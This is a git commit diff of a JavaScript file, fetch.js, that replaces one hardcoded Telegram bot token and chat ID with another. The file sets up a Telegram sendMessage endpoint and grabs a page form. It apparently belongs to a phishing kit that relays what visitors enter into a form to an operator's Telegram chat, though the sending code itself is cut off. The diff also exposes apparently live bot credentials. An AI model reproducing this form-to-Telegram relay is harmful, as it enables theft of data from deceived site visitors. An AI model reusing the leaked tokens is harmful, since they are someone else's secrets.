04a892d01b748bd273bd91da552f3e937ba3f596
in-update-id <126193529+in-update-id@users.noreply.github.com>
2023-02-28 22:28:30 +0700

    Update fetch.js

--- fetch.js
+++ fetch.js
@@ -1,7 +1,7 @@
 
         
-    const TOKEN = "6241613294:AAFCdV4EfVf7LXrJV-FX3t4xcCG5R3iMFaE";
-const CHAT_ID = "5809822819";
+    const TOKEN = "5980163209:AAEGENMLJbVfrqcIl7cO23H1LOPe_1Fka6U";
+const CHAT_ID = "6077916114";
 const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
 const form = document.getElementById("fetch");
